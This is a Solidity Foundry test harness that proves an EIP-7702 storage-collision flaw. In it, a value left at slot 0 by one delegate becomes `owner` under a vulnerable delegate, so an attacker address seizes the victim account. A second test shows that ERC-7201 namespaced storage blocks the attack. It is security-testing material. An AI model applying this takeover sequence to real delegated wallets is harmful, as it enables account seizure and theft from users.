// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, Vm} from "forge-std/Test.sol";
import {PlainStorageDelegate} from "../corpus/vulnerable/PlainStorageDelegate.sol";
import {NamespacedDelegate} from "../corpus/safe/NamespacedDelegate.sol";

/// @dev A prior delegate whose slot 0 is an arbitrary, attacker-writable "value".
contract SlotZeroWriter {
    uint256 public value; // slot 0
    function setValue(uint256 v) external { value = v; }
}

/// @dev A benign call target the seized account is made to drive.
contract Target {
    bool public poked;
    function poke() external { poked = true; }
}

/// @notice Dynamic proof for eip7702-storage-collision (V4). Storage set under one delegate
///         PERSISTS into the next delegate's clashing layout: a value written at slot 0 under
///         delegate A is reinterpreted as `owner` under PlainStorageDelegate, seizing the account.
///         Two-way: PlainStorageDelegate is exploitable; NamespacedDelegate (ERC-7201) is not.
contract StorageContaminationHarness is Test {
    address internal constant ATTACKER = address(0xA11CE);

    function test_plainStorage_collisionSeizesAccount() public {
        Vm.Wallet memory eoa = vm.createWallet("victim");
        SlotZeroWriter writer = new SlotZeroWriter();
        PlainStorageDelegate plain = new PlainStorageDelegate();
        Target t = new Target();

        // 1) under delegate A, slot 0 is a "value" the attacker sets to their own address-as-uint.
        vm.signAndAttachDelegation(address(writer), eoa.privateKey);
        SlotZeroWriter(eoa.addr).setValue(uint256(uint160(ATTACKER)));

        // 2) re-delegate to a DIFFERENT layout where slot 0 is `owner`.
        vm.signAndAttachDelegation(address(plain), eoa.privateKey);

        // 3) the leftover "value" is now read as `owner` -> the attacker owns the account.
        assertEq(PlainStorageDelegate(eoa.addr).owner(), ATTACKER, "slot 0 collision: value reinterpreted as owner");

        // 4) the attacker drives the seized account through the owner-gated entrypoint.
        vm.prank(ATTACKER);
        PlainStorageDelegate(eoa.addr).execute(address(t), abi.encodeCall(Target.poke, ()));
        assertTrue(t.poked(), "attacker controls the contaminated account");
    }

    function test_namespaced_resistsCollision() public {
        Vm.Wallet memory eoa = vm.createWallet("victim2");
        SlotZeroWriter writer = new SlotZeroWriter();
        NamespacedDelegate ns = new NamespacedDelegate();
        Target t = new Target();

        vm.signAndAttachDelegation(address(writer), eoa.privateKey);
        SlotZeroWriter(eoa.addr).setValue(uint256(uint160(ATTACKER)));

        vm.signAndAttachDelegation(address(ns), eoa.privateKey);

        // owner lives in ERC-7201 namespaced storage -> the slot-0 value can't touch it -> reverts.
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("not owner"));
        NamespacedDelegate(eoa.addr).execute(address(t), abi.encodeCall(Target.poke, ()));
    }
}
